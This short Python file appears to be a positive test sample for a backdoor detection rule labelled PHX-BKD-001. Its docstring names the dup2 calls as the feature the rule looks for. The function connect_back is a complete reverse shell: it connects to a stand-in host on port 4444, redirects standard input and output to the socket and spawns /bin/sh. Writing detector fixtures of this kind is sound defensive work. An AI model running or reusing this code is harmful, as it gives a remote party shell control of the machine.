"""PHX-BKD-001 positive: a connected socket whose fd is duplicated onto stdio, then a shell.

The dup2 triple is the discriminator -- socket_echo_server is the same socket code without it.
"""
import os
import pty
import socket


def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("203.0.113.9", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/sh")
